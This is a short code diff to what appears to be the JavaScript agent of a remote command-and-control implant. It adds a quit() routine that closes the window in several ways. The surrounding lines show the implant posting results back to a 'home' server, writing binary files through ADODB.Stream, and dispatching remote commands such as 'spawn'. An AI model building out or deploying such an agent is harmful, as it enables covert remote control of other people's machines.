@@ -57,6 +57,25 @@ function post(home, response) {
   return res;
 }
 
+function quit() {
+  try {
+    window.close();
+  }
+  catch(e){}
+  try {
+    window.self.close();
+  }
+  catch (e){}
+  try {
+    window.top.close();
+  }
+  catch (e){}
+  try {
+    self.close();
+  }
+  catch (e){}
+}
+
 function writebinfile(filename, content) {
         var stream = new ActiveXObject("ADODB.Stream")
         stream.Open()
@@ -140,8 +159,8 @@ function main()
 		var rettype = "retval"
 	    //kill
 	    if(jsObject.cmnd == "quit") {
-		    window.close(true)
-			self.close()
+              retval = "[*] Shutting down..."
+              quit()
 	    }
 
 	    else if(jsObject.cmnd == "spawn") {
